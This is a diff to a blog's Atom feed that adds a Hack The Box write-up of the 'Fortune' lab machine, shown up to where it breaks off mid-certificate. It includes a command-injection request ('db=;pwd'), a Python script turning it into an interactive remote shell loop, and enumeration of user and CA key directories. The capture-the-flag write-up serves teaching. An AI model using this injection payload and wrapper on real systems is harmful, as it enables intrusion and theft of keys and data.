@@ -1,4 +1,633 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-07-27T15:25:39+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - LaCasaDePapel</title><link href="http://localhost:4000/hack-the-box/lacasadepapel/" rel="alternate" type="text/html" title="Hack The Box - LaCasaDePapel" /><published>2019-07-27T00:00:00+02:00</published><updated>2019-07-27T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/lacasadepapel</id><content type="html" xml:base="http://localhost:4000/hack-the-box/lacasadepapel/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-08-03T13:01:00+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Fortune</title><link href="http://localhost:4000/hack-the-box/fortune/" rel="alternate" type="text/html" title="Hack The Box - Fortune" /><published>2019-08-03T00:00:00+02:00</published><updated>2019-08-03T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/fortune</id><content type="html" xml:base="http://localhost:4000/hack-the-box/fortune/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-today-fortune-retired-and-heres-my-write-up-about-it-it-was-a-very-cool-box-and-i-really-liked-it-like-the-last-retired-box-lacasadepapel-it-had-rce-and-client-certificate-generation-to-access-a-restricted-https-service-but-thats-only-for-the-initial-steps-as-this-box-had-a-lot-of-interesting-stuff-its-an-openbsd-box-and-its-ip-is-101010127-i-added-it-to-etchosts-as-fortunehtb-lets-jump-right-in-&quot;&gt;Hey guys today Fortune retired and here’s my write-up about it. It was a very cool box and I really liked it, like the last retired box &lt;a href=&quot;/hack-the-box/lacasadepapel&quot;&gt;LaCasaDePapel&lt;/a&gt; it had &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; and client certificate generation to access a restricted &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; service, but that’s only for the initial steps as this box had a lot of interesting stuff. It’s an OpenBSD box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.127&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;fortune.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC fortune.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/fortune/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-have-http-https-on-port-80-port-443-and-we-have-ssh-on-port-22-so-we-will-be-focusing-on-the-web-services&quot;&gt;We have &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;https&lt;/code&gt; on port 80, port 443 and we have &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22 so we will be focusing on the web services.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
+&lt;h4 id=&quot;the-index-page-on-httpfortunehtb-is-pretty-simple-we-have-some-options-where-we-can-choose-a-database-of-fortunes-and-we-will-get-a-random-fortune-from-that-database-&quot;&gt;The index page on &lt;code class=&quot;highlighter-rouge&quot;&gt;http://fortune.htb&lt;/code&gt; is pretty simple, we have some options where we can choose a database of fortunes and we will get a random fortune from that database :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/2.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/fortune/3.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;img src=&quot;/images/hackthebox/fortune/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;on-httpsfortunehtb-we-get-a-handshake-error-this-probably-means-that-we-need-a-client-certificate&quot;&gt;On &lt;code class=&quot;highlighter-rouge&quot;&gt;https://fortune.htb&lt;/code&gt; we get a handshake error, this probably means that we need a client certificate.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;rce-client-certificate-generation&quot;&gt;RCE, Client Certificate Generation&lt;/h3&gt;
+&lt;h4 id=&quot;back-to-httpfortunehtb-i-intercepted-the-request-with-burp-and-there-was-only-one-parameter-in-the-post-request-called-db-after-trying-some-different-things-i-could-get-rce-by-appending-a-semi-colon--&quot;&gt;Back to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://fortune.htb&lt;/code&gt; I intercepted the request with burp and there was only one parameter in the POST request called &lt;code class=&quot;highlighter-rouge&quot;&gt;db&lt;/code&gt;, after trying some different things I could get &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; by appending a semi-colon &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt; :&lt;/h4&gt;
+&lt;h4 id=&quot;request-&quot;&gt;Request :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /select HTTP/1.1
+Host: fortune.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://fortune.htb/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 7
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+db=;pwd
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;response-&quot;&gt;Response :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
+Connection: close
+Content-Type: text/html; charset=utf-8
+Date: Fri, 02 Aug 2019 11:08:49 GMT
+Server: OpenBSD httpd
+Content-Length: 680
+
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Your fortune&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'viewport'&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'width=device-width, initial-scale=1'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;http-equiv=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;X-UA-Compatible&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;content=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;IE=edge&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Your fortune is:&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&amp;lt;pre&amp;gt;&lt;/span&gt;
+
+Bagbiter:
+	1. n.; Equipment or program that fails, usually
+intermittently.  2. adj.:  Failing hardware or software.  &lt;span class=&quot;ni&quot;&gt;&amp;amp;#34;&lt;/span&gt;This
+bagbiting system won&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;t let me get out of spacewar.&lt;span class=&quot;ni&quot;&gt;&amp;amp;#34;&lt;/span&gt;  Usage:  verges on
+obscenity.  Grammatically separable; one may speak of &lt;span class=&quot;ni&quot;&gt;&amp;amp;#34;&lt;/span&gt;biting the
+bag&lt;span class=&quot;ni&quot;&gt;&amp;amp;#34;&lt;/span&gt;.  Synonyms: LOSER, LOSING, CRETINOUS, BLETCHEROUS, BARFUCIOUS,
+CHOMPER, CHOMPING.
+/var/appsrv/fortune
+
+
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&amp;lt;p&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Try &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/'&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;again&lt;span class=&quot;nt&quot;&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;!&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-couldnt-get-a-reverse-shell-get-ssh-or-read-the-user-flag-so-we-are-going-to-enumerate-the-box-through-this-rce-for-some-time&quot;&gt;I couldn’t get a reverse shell, get &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; or read the user flag so we are going to enumerate the box through this &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; for some time.&lt;/h4&gt;
+&lt;h4 id=&quot;i-wrote-a-script-to-make-it-easier-&quot;&gt;I wrote a script to make it easier :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;sys&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[93m&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\033&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[32m&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;db&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;http://10.10.10.127/select&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rce_result&quot;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rce_result_end&quot;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rfind&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;rce&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[?] command : &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;;echo rce_result;{};echo rce_result_end&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rce&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;filter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Result :&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;this-script-takes-the-command-to-execute-then-sends-the-payload-which-is-echo-rce_resultcommandecho-rce_result_end-then-it-searches-through-the-response-and-prints-the-string-between-rce_result-and-rce_result_end-which-is-the-output-of-our-command&quot;&gt;This script takes the command to execute then sends the payload which is &lt;code class=&quot;highlighter-rouge&quot;&gt;;echo rce_result;COMMAND;echo rce_result_end&lt;/code&gt; then it searches through the response and prints the string between &lt;code class=&quot;highlighter-rouge&quot;&gt;rce_result&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;rce_result_end&lt;/code&gt; which is the output of our command.&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/fortune/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;there-are-3-users-on-the-box--bob-charlie-and-nfsuser-&quot;&gt;There are 3 users on the box : &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;charlie&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;nfsuser&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : ls -la /home
+[*] Result :
+
+total 20
+drwxr-xr-x   5 root     wheel    512 Nov  2  2018 .
+drwxr-xr-x  13 root     wheel    512 Aug  2 05:47 ..
+drwxr-xr-x   5 bob      bob      512 Nov  3  2018 bob
+drwxr-x---   3 charlie  charlie  512 Aug  2 06:21 charlie
+drwxr-xr-x   2 nfsuser  nfsuser  512 Nov  2  2018 nfsuser
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;in-bobs-home-directory-there-was-a-directory-called-ca-&quot;&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;bob&lt;/code&gt;’s home directory there was a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;ca&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : ls -la /home/bob
+[*] Result :
+
+total 48
+drwxr-xr-x  5 bob   bob    512 Nov  3  2018 .
+drwxr-xr-x  5 root  wheel  512 Nov  2  2018 ..
+-rw-r--r--  1 bob   bob     87 Oct 11  2018 .Xdefaults
+-rw-r--r--  1 bob   bob    771 Oct 11  2018 .cshrc
+-rw-r--r--  1 bob   bob    101 Oct 11  2018 .cvsrc
+-rw-r--r--  1 bob   bob    359 Oct 11  2018 .login
+-rw-r--r--  1 bob   bob    175 Oct 11  2018 .mailrc
+-rw-r--r--  1 bob   bob    215 Oct 11  2018 .profile
+-rw-------  1 bob   bob     13 Nov  3  2018 .psql_history
+drwx------  2 bob   bob    512 Nov  2  2018 .ssh
+drwxr-xr-x  7 bob   bob    512 Oct 29  2018 ca
+drwxr-xr-x  2 bob   bob    512 Nov  2  2018 dba
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-enumerated-that-directory-for-some-time-and-there-was-a-directory-called-intermediate-where-i-found-a-certificate-and-a-key-&quot;&gt;I enumerated that directory for some time and there was a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;intermediate&lt;/code&gt; where I found a certificate and a key :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[?] command : ls -la /home/bob/ca
+[*] Result :
+
+total 56
+drwxr-xr-x  7 bob  bob   512 Oct 29  2018 .
+drwxr-xr-x  5 bob  bob   512 Nov  3  2018 ..
+drwxr-xr-x  2 bob  bob   512 Oct 29  2018 certs
+drwxr-xr-x  2 bob  bob   512 Oct 29  2018 crl
+-rw-r--r--  1 bob  bob   115 Oct 29  2018 index.txt
+-rw-r--r--  1 bob  bob    21 Oct 29  2018 index.txt.attr
+-rw-r--r--  1 bob  bob     0 Oct 29  2018 index.txt.old
+drwxr-xr-x  7 bob  bob   512 Nov  3  2018 intermediate
+drwxr-xr-x  2 bob  bob   512 Oct 29  2018 newcerts
+-rw-r--r--  1 bob  bob  4200 Oct 29  2018 openssl.cnf
+drwx------  2 bob  bob   512 Oct 29  2018 private
+-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial
+-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial.old
+
+[?] command : ls -la /home/bob/ca/intermediate
+[*] Result :
+
+total 60
+drwxr-xr-x  7 bob  bob   512 Nov  3  2018 .
+drwxr-xr-x  7 bob  bob   512 Oct 29  2018 ..
+drwxr-xr-x  2 bob  bob   512 Nov  3  2018 certs
+drwxr-xr-x  2 bob  bob   512 Oct 29  2018 crl
+-rw-r--r--  1 bob  bob     5 Oct 29  2018 crlnumber
+drwxr-xr-x  2 bob  bob   512 Oct 29  2018 csr
+-rw-r--r--  1 bob  bob   107 Oct 29  2018 index.txt
+-rw-r--r--  1 bob  bob    21 Oct 29  2018 index.txt.attr
+drwxr-xr-x  2 bob  bob   512 Oct 29  2018 newcerts
+-rw-r--r--  1 bob  bob  4328 Oct 29  2018 openssl.cnf
+drwxr-xr-x  2 bob  bob   512 Oct 29  2018 private
+-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial
+-rw-r--r--  1 bob  bob     5 Oct 29  2018 serial.old
+
+[?] command : ls -la /home/bob/ca/intermediate/certs
+[*] Result :
+
+total 32
+drwxr-xr-x  2 bob  bob   512 Nov  3  2018 .
+drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
+-r--r--r--  1 bob  bob  4114 Oct 29  2018 ca-chain.cert.pem
+-r--r--r--  1 bob  bob  1996 Oct 29  2018 fortune.htb.cert.pem
+-r--r--r--  1 bob  bob  2061 Oct 29  2018 intermediate.cert.pem
+
+[?] command : ls -la /home/bob/ca/intermediate/private
+[*] Result :
+
+total 20
+drwxr-xr-x  2 bob  bob   512 Oct 29  2018 .
+drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
+-r--------  1 bob  bob  1675 Oct 29  2018 fortune.htb.key.pem
+-rw-r--r--  1 bob  bob  3243 Oct 29  2018 intermediate.key.pem
+
+[?] command : cat /home/bob/ca/intermediate/certs/intermediate.cert.pem
+[*] Result :
+
+-----BEGIN CERTIFICATE-----                           
+MIIFxDCCA6ygAwIBAgICEAAwDQYJKoZIhvcNAQELBQAwbTELMAkGA1UEBhMCQ0Ex
+CzAJBgNVBAgMAk9OMRcwFQYDVQQKDA5Gb3J0dW5lIENvIEhUQjEYMBYGA1UEAwwP
+Rm9ydHVuZSBSb290IENBMR4wHAYJKoZIhvcNAQkBFg9ib2JAZm9ydHVuZS5odGIw
+HhcNMTgxMDMwMDA1NjQzWhcNMjgxMDI3MDA1NjQzWjB1MQswCQYDVQQGEwJDQTEL
+MAkGA1UECAwCT04xFzAVBgNVBAoMDkZvcnR1bmUgQ28gSFRCMSAwHgYDVQQDDBdG
+b3J0dW5lIEludGVybWVkaWF0ZSBDQTEeMBwGCSqGSIb3DQEJARYPYm9iQGZvcnR1
+bmUuaHRiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAuTGpzUbl4RIy
+DuJv8S36vZm96P8FoUgseznDqNOqAEN+qU6NTzZAjOvCAJu7tiJjnvrUxf4SzuLR
+QEsU99R6UDBj/rz1dMRq3P/7VdbNC5o2zrd99fN/MDz288Rv7Z24LKWvPoEFWU5D
+SpQo+lregWcl4yzTS0hHQjjk/aGPPkLFhT1oW/kbz9205JT1LvR+mqNWbH/0Q92K
+7Ns3b2UqEdvD0nm/t7SAphhkGYEtsxyEdiI97sB6jXxlgHzblwFlQaHvh6H7u6rC
+m/VGQDFmY3d/zA1TtZ0vuAJ2/EEs0NU6XySL6YmfIsPJdu4NoeEeXofqwQjNf2bs
+jgQZrOujLxTBo1L4cFsNvZVwwNscyr+wZM/SybEGB3vBe4e+wvzkT7YD4lqubvXZ
+O346jKcnOF/lviF6HmxhUL5pac4XHNYPJhVoKmimYUWi2fJ/1B2PgRrzv/mmlgL7
+JOpJNWMUbc8bEf698QziuCXj5R/+Lover058nrvCAnI4I4wUHTGAgOC1J4hbVoYX
+EjK1GT+zlnX9+JAqGthxxqQp/YXYk1lgA5xpANJIlxH0gwaTQ4a8HAPBliHnEV0v
+XK38+yzRe1/uD3OUWKw+DYD/EmH78QiAr7Yb7K4H1yh5VF9zkLCTN6WYoaSM1Z0T
+nb8nv8SUuSwsa/piZvRo7VqzYbDtl8MCAwEAAaNmMGQwHQYDVR0OBBYEFNBS/hId
+Md8NPcYbC32/OSwFbZzUMB8GA1UdIwQYMBaAFFOdNrSGE+IcSQJs1UTIogSJ2i5W
+MBIGA1UdEwEB/wQIMAYBAf8CAQAwDgYDVR0PAQH/BAQDAgGGMA0GCSqGSIb3DQEB
+CwUAA4ICAQAJ0/abFm23OqxhuRPiGr7VfRn8DbsyQ7oVB8zxJsgfgWkXTKuTtJti
+zhZSFR8/JMUYhRLwdkjf8w3hA7GKF9VS3kioEDGROtx++ZQc1ljI7owLfDYfhQ08
+0CJiXxmwO4XupL23cxu9i9464+knHvqvE1Uhj/L9HO5pVD5uAS2kePnSju7n08gg
